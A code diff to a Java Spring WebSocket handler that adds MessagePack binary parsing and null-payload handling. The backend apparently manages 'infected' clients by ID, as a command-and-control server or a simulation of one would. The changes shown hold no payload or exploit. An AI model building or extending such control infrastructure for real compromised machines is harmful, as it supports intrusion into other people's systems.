@@ -6,9 +6,12 @@ import at.simcc.simcc_backend.api.ws.payload.*;
 import com.fasterxml.jackson.annotation.JsonInclude;
 import lombok.RequiredArgsConstructor;
 import lombok.extern.slf4j.Slf4j;
+import org.msgpack.core.MessagePack;
+import org.msgpack.core.MessageUnpacker;
 import org.springframework.http.HttpStatus;
 import org.springframework.stereotype.Component;
 import org.springframework.web.server.ResponseStatusException;
+import org.springframework.web.socket.BinaryMessage;
 import org.springframework.web.socket.CloseStatus;
 import org.springframework.web.socket.TextMessage;
 import org.springframework.web.socket.WebSocketSession;
@@ -40,6 +43,41 @@ public class WebsocketHandler extends AbstractWebSocketHandler {
     private final Map<String, CompletableFuture<WSAwaitable>> pendingRequests = new ConcurrentHashMap<>();
 
     private final InfectedSSEComponent infectedSSEComponent;
+
+
+    @Override
+    protected void handleBinaryMessage(WebSocketSession session, BinaryMessage message) throws Exception {
+        try {
+            MessageUnpacker unpacker = MessagePack.newDefaultUnpacker(message.getPayload());
+            int mapSize = unpacker.unpackMapHeader();
+            for (int i = 0; i < mapSize; i++) {
+                String field = unpacker.unpackString();
+
+                if (field.equals("type")) {
+                    MessageType messageType = MessageType.valueOf(unpacker.unpackString());
+                    MsgPackDeserialize<?> instance = (MsgPackDeserialize<?>) messageType
+                            .getType()
+                            .getDeclaredConstructor()
+                            .newInstance();
+
+                    if (unpacker.unpackString().equals("payload")) {
+                        WSAwaitable payload = (WSAwaitable) instance.deserialize(unpacker, unpacker.unpackMapHeader());
+                        pendingRequests.get(payload.getId()).complete(payload);
+                    }
+                }
+            }
+            unpacker.close();
+        } catch (Exception e) {
+            sendError(
+                    session,
+                    ERRPayload.builder()
+                            .msg(e.getMessage())
+                            .type(ErrType.INV_REQ)
+                            .build()
+            );
+        }
+    }
+
 
     @Override
     public void handleTextMessage(WebSocketSession session, TextMessage message) throws IOException {
@@ -119,7 +157,10 @@ public class WebsocketHandler extends AbstractWebSocketHandler {
 
 
         // inject id
-        WSAwaitable awaitable = (WSAwaitable) objectMapper.treeToValue(message.getPayload(), message.getType().getType());
+        WSAwaitable awaitable = new WSAwaitable();
+        if (message.getPayload() != null) {
+            awaitable = (WSAwaitable) objectMapper.treeToValue(message.getPayload(), message.getType().getType());
+        }
         awaitable.setId(id);
 
         message.setPayload(objectMapper.valueToTree(awaitable));
@@ -138,7 +179,7 @@ public class WebsocketHandler extends AbstractWebSocketHandler {
         WebSocketSession session = sessions.stream()
                 .filter(s -> s.getAttributes().get("iid").equals(iid))
                 .findFirst()
-                .orElseThrow(() -> new ResponseStatusException(HttpStatus.NOT_FOUND, "Infected %s not found!".formatted(iid)));
+                .orElseThrow(() -> new ResponseStatusException(HttpStatus.NOT_FOUND, "Infected %s not online or not existing!".formatted(iid)));
 
         return sendMessageAndWait(session, message);
     }
